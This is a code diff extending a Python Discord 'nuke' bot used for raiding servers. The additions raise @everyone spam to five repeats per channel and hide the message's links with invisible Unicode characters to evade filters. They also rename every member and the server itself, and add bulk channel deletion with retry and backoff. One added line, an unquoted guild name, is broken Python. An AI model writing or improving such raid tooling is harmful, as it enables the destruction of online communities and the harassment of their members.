@@ -17,15 +17,24 @@ INTENTS = discord.Intents.default()
 INTENTS.guilds = True
 INTENTS.messages = True
 INTENTS.message_content = True
+INTENTS.members = True  # メンバー一覧・編集に必要
 
 # Behavioral params
 ROLE_BASE = "ozeumember"
 ROLE_COUNT = 5
-CHANNEL_BASE = "prank-channel"
+CHANNEL_BASE = "ozeu-nuke"
 CHANNEL_COUNT = 20
 
 REPEAT_MESSAGE = "# @everyone\n# Raid by OZEU. join now\n# おぜうの集いに参加！\n# https://\ptb．discord．com/../oze/../invite/ozeu-x [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/yNx4Me2) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&) [︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567562863939726/GtZ9HYjbkAA9bPR.webp?ex=684f4334&is=684df1b4&hm=76921f9aff9c6f4b90feaf662c07ca2bb48257ef2bb7fdf39fb5a6df94740967&) [︋︍︋](https://m︋︍︋e︋︍︋d︋︍︋i︋︍︋a︋︍︋.︋︍discordapp.net/attachments/1381064393189621860/1383567672725340230/Gri2PLOboAI8ZRV.jpeg?ex=684f434e&is=684df1ce&hm=c28e7c872cdcb1420d8f565211714fa33bef522a879eca292c280439173a9ea2&) [︋︍︋](https://i︋︍︋m︋︍︋g︋︍︋u︋︍︋r︋︍︋.︋︍com/NbBGFcf)"
-REPEAT_COUNT = 1  # 各チャンネルに送信する回数
+REPEAT_COUNT = 5  # 各チャンネルに送信する回数
+
+# Nickname & guild rename params
+CHANGE_NICKNAMES = True          # True にすると全メンバーのニックネームを変更する
+NICK_BASE = "おぜう様万歳！"             # 例: member-1, member-2, ...
+NICK_CHUNK_SIZE = 12
+NICK_CHUNK_SLEEP = 0.12
+
+NEW_GUILD_NAME = おぜう植民地            # None のままだとサーバー名は変更しない。例: "New Server Name"
 
 # Parallelism / timing
 DELETE_CHUNK_SIZE = 8
@@ -35,6 +44,7 @@ CREATE_CHUNK_SLEEP = 0.12
 MSG_CHUNK_SIZE = 10
 MSG_INTER_CHUNK_SLEEP = 0.01
 MSG_INTER_ROUND_SLEEP = 0.02
+MSG_MAX_RETRIES = 3
 POST_DELETE_WAIT = 3.0
 # ---------------------------------------
 
@@ -75,7 +85,7 @@ async def safe_create_channel(guild: discord.Guild, name: str):
         logger.warning(f"Create failed {name}: {e}")
         return None
 
-async def safe_send(ch: discord.TextChannel, content: str, max_retries=3):
+async def safe_send(ch: discord.TextChannel, content: str, max_retries=MSG_MAX_RETRIES):
     if not ch or not content:
         return
     retries = 0
@@ -84,16 +94,16 @@ async def safe_send(ch: discord.TextChannel, content: str, max_retries=3):
             await ch.send(str(content)[:2000])
             return
         except discord.errors.Forbidden:
-            logger.warning(f"Forbidden: cannot send to {ch.name}")
+            logger.warning(f"Forbidden: cannot send to {getattr(ch,'name',ch)}")
             return
         except discord.errors.HTTPException as e:
             retries += 1
             if retries > max_retries:
-                logger.warning(f"HTTPException send failed {ch.name}: {e}")
+                logger.warning(f"HTTPException send failed {getattr(ch,'name',ch)}: {e}")
                 return
             await asyncio.sleep(0.5 * (2 ** (retries - 1)))
         except Exception as e:
-            logger.exception(f"Unexpected send error {ch.name}: {e}")
+            logger.exception(f"Unexpected send error {getattr(ch,'name',ch)}: {e}")
             return
 
 async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, repeat: int):
@@ -106,12 +116,66 @@ async def send_repeated_messages(channels: List[discord.TextChannel], msg: str, 
             await asyncio.sleep(MSG_INTER_CHUNK_SLEEP)
         await asyncio.sleep(MSG_INTER_ROUND_SLEEP)
 
+# --- NEW: change nicknames safely ---
+async def safe_change_nick(member: discord.Member, new_nick: str, max_retries=2):
+    try:
+        await member.edit(nick=new_nick, reason="nuke bulk nickname change")
+        return True
+    except discord.errors.Forbidden:
+        logger.warning(f"Forbidden: cannot change nick for {member} ({member.id})")
+        return False
+    except discord.errors.HTTPException as e:
+        # transient
+        for attempt in range(1, max_retries+1):
+            backoff = 0.5 * (2 ** (attempt - 1))
+            await asyncio.sleep(backoff)
+            try:
+                await member.edit(nick=new_nick, reason="nuke bulk nickname change retry")
+                return True
+            except Exception:
+                continue
+        logger.warning(f"HTTPException changing nick {member}: {e}")
+        return False
+    except Exception as e:
+        logger.exception(f"Unexpected error changing nick {member}: {e}")
+        return False
+
+async def change_all_nicknames(guild: discord.Guild, base: str, chunk_size: int = 12, chunk_sleep: float = 0.12):
+    """
+    全メンバーのニックネームを base-<index> の形式で変更（Bot は除外）。
+    権限不足や特定メンバーで失敗しても処理を継続する。
+    """
+    members = [m for m in guild.members if not m.bot]
+    if not members:
+        logger.info("No human members to rename")
+        return 0
+
+    changed = 0
+    # assign names deterministic: base-1 ... base-N
+    idx = 1
+    tasks = []
+    for m in members:
+        new_nick = f"{base}-{idx}"
+        tasks.append( (m, new_nick) )
+        idx += 1
+
+    for group in chunk_list(tasks, chunk_size):
+        coros = [safe_change_nick(m, nick) for (m, nick) in group]
+        results = await asyncio.gather(*coros, return_exceptions=True)
+        for res in results:
+            if isinstance(res, Exception):
+                logger.warning(f"Exception when changing nick: {res}")
+            elif res is True:
+                changed += 1
+        await asyncio.sleep(chunk_sleep)
+    return changed
+
 def bot_has_permissions(guild: discord.Guild):
     me = guild.me
     if me is None:
         return False
     perms = me.guild_permissions
-    return perms.manage_channels and perms.manage_roles and perms.send_messages
+    return perms.manage_channels and perms.manage_roles and perms.send_messages and perms.manage_nicknames
 
 def admin_only():
     async def predicate(ctx):
@@ -135,10 +199,10 @@ async def nuke(ctx):
         await ctx.send("サーバー内で実行してください。")
         return
     if not bot_has_permissions(guild):
-        await ctx.send("Bot に必要な権限がありません。")
+        await ctx.send("Bot に必要な権限がありません（Manage Channels / Manage Roles / Manage Nicknames / Send Messages）。")
         return
 
-    # backup channel
+    # create backup channel first for notifications; exclude it from deletion
     try:
         backup_name = f"nuke-backup-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}"
         backup_channel = await guild.create_text_channel(backup_name)
@@ -147,9 +211,28 @@ async def nuke(ctx):
         await ctx.send(f"バックアップチャンネル作成失敗: {e}")
         return
 
-    # DELETE
+    # Optional: change guild (server) name once
+    if NEW_GUILD_NAME:
+        try:
+            await guild.edit(name=NEW_GUILD_NAME, reason="nuke: rename guild")
+            await backup_channel.send(f"🔁 サーバー名を \"{NEW_GUILD_NAME}\" に変更しました。")
+        except Exception as e:
+            logger.warning(f"Guild rename failed: {e}")
+            await backup_channel.send(f"⚠️ サーバー名変更に失敗しました: {e}")
+
+    # Optional: change all member nicknames BEFORE destructive channel ops
+    if CHANGE_NICKNAMES:
+        await backup_channel.send("👥 全メンバーのニックネームを変更します（開始）...")
+        try:
+            changed_count = await change_all_nicknames(guild, NICK_BASE, chunk_size=NICK_CHUNK_SIZE, chunk_sleep=NICK_CHUNK_SLEEP)
+            await backup_channel.send(f"👥 ニックネーム変更完了: 成功 {changed_count} / 合計 {len([m for m in guild.members if not m.bot])}")
+        except Exception as e:
+            logger.exception(f"ニックネーム変更フェーズ例外: {e}")
+            await backup_channel.send(f"⚠️ ニックネーム変更フェーズで例外が発生しました: {e}")
+
+    # DELETE channels (chunked)
     channels_to_delete = [c for c in guild.channels if c.id != backup_channel.id]
-    await backup_channel.send(f"🧹 削除対象: {len(channels_to_delete)} 件")
+    await backup_channel.send(f"🧹 削除対象: {len(channels_to_delete)} 件（バックアップチャンネルを除外）")
     for group in chunk_list(channels_to_delete, DELETE_CHUNK_SIZE):
         await asyncio.gather(*(safe_delete_channel(c) for c in group))
         await asyncio.sleep(DELETE_CHUNK_SLEEP)
